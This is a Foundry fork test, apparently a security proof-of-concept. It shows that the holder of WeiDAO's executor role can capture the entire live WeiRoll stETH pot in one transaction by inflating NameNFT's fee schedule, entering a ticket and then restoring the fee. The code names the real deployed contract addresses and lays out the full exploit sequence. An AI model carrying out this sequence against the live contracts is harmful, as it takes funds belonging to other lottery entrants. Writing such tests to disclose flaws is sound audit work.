// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "@forge/Test.sol";
import {WeiRoll} from "../src/WeiRoll.sol";

interface IWNS {
    function owner() external view returns (address);
    function getFee(uint256) external view returns (uint256);
    function setLengthFees(uint256[] calldata, uint256[] calldata) external;
    function makeCommitment(string calldata, address, bytes32) external pure returns (bytes32);
    function commit(bytes32) external;
    function reveal(string calldata, bytes32) external payable returns (uint256);
    function ownerOf(uint256) external view returns (address);
}

interface IDao {
    function executor() external view returns (address);
    function rescue(address, uint256, bytes calldata) external returns (bytes memory);
}

interface ISteth {
    function sharesOf(address) external view returns (uint256);
}

/// @notice PoC against the LIVE deployment: `exec.dao.wei` can capture the whole WeiRoll pot in
///         one transaction, with no proposal, no timelock, and the fee schedule left as it found
///         it. WeiRoll's `weightOf` reads NameNFT's *live* fee schedule against an already-paid
///         registration term, WeiDAO owns NameNFT, and WeiDAO's executor can make any owner call
///         directly. Entry freezes the inflated weight into the ticket, so the fee can be put back
///         in the same transaction.
///
///         Self-skips unless `RUN_FORK_EXEC=true`. Run:
///         `RUN_FORK_EXEC=true forge test --match-contract ForkWeiRollExecCapture -vvv`.
contract ForkWeiRollExecCapture is Test {
    WeiRoll constant ROLL = WeiRoll(payable(0x0000C82AA4D72871568eF3859D2b0E7CF37e45f2));
    IWNS constant NFT = IWNS(0x0000000000696760E15f265e828DB644A0c242EB);
    IDao constant DAO = IDao(0x00000007988A79d16cf76B5dc4cF54dc3Af24936);
    address constant WRAPPER = 0x02aae1A04f9828517b3007f83f6181900CaD910c;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    address attacker = address(0xA77ACC);
    bool skipped;

    function setUp() public {
        if (!vm.envOr("RUN_FORK_EXEC", false)) { skipped = true; return; }
        vm.createSelectFork(vm.rpcUrl("main5"));
        vm.txGasPrice(20 gwei);
    }

    modifier onlyFork() { if (skipped) { vm.skip(true); return; } _; }

    function testExecCapturesTheLivePot() public onlyFork {
        uint256 r = ROLL.round();
        uint256 honest = ROLL.totalWeight(r);
        uint256 pot = ROLL.pot();
        address exec = DAO.executor();

        emit log_named_uint("round", r);
        emit log_named_uint("live entrants", ROLL.ticketCount(r));
        emit log_named_decimal_uint("live pot (stETH)", pot, 18);
        emit log_named_decimal_uint("live total weight", honest, 18);
        emit log_named_address("exec.dao.wei holder", exec);
        assertEq(NFT.owner(), address(DAO), "NameNFT is owned by WeiDAO");
        assertTrue(exec != address(0), "the exec role is live");

        // The attacker buys one ordinary 5-char name at the ordinary price.
        uint256 feeBefore = NFT.getFee(5);
        vm.deal(attacker, 10 ether);
        vm.startPrank(attacker);
        NFT.commit(NFT.makeCommitment("aaqzx", attacker, bytes32("s")));
        vm.warp(block.timestamp + 120);
        uint256 tok = NFT.reveal{value: feeBefore}("aaqzx", bytes32("s"));
        vm.stopPrank();
        uint256 fairWeight = ROLL.weightOf(tok);
        emit log_named_decimal_uint("fair weight of that name", fairWeight, 18);

        // ---- the single transaction ----
        uint256[] memory lens = new uint256[](1);
        uint256[] memory fees = new uint256[](1);
        lens[0] = 5;

        vm.startPrank(exec);
        fees[0] = 1_000_000 ether; // no cap in setLengthFees
        DAO.rescue(address(NFT), 0, abi.encodeCall(IWNS.setLengthFees, (lens, fees)));
        vm.stopPrank();

        vm.prank(attacker);
        ROLL.enter(tok, 0);

        vm.startPrank(exec);
        fees[0] = feeBefore; // restore; the ticket already froze the inflated weight
        DAO.rescue(address(NFT), 0, abi.encodeCall(IWNS.setLengthFees, (lens, fees)));
        vm.stopPrank();
        // ---- end ----

        uint256 got = ROLL.weightIn(r, tok);
        emit log_named_decimal_uint("attacker ticket weight", got, 18);
        emit log_named_uint("odds (bps of total)", got * 10_000 / ROLL.totalWeight(r));
        assertEq(NFT.getFee(5), feeBefore, "fee schedule restored");
        assertGt(got, honest * 100_000, "the attacker dwarfs the entire honest field");

        // Settle the round for real: draw, then deliver a seed as the wrapper.
        vm.warp(ROLL.roundEnd());
        uint256 price = ROLL.drawPrice();
        vm.deal(attacker, price);
        vm.prank(attacker, attacker);
        ROLL.draw{value: price}();

        uint256[] memory words = new uint256[](1);
        words[0] = uint256(keccak256("any seed at all"));
        uint256 id = ROLL.requestId();
        vm.prank(WRAPPER);
        ROLL.rawFulfillRandomWords(id, words);

        assertEq(ROLL.winnerOf(r), tok, "attacker wins");
        vm.prank(attacker);
        ROLL.claim(r);
        emit log_named_decimal_uint("attacker stETH shares", ISteth(STETH).sharesOf(attacker), 18);
        assertGt(ISteth(STETH).sharesOf(attacker), 0, "pot captured");
        emit log_named_decimal_uint("cost of the attack (ETH)", feeBefore, 18);
    }
}
